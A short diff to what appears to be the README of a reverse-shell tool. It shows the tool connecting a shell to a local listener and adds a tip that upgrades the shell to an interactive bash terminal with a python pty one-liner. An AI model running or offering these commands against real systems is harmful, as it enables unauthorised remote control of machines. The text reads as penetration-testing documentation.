@@ -25,3 +25,9 @@ On the 'server' side, we bind the shell to the listener :
 ```
 ./reverse-shell 127.0.0.1 4445
 ```
+
+## Tip
+Once you have the shell, if you want to be more confortable :
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
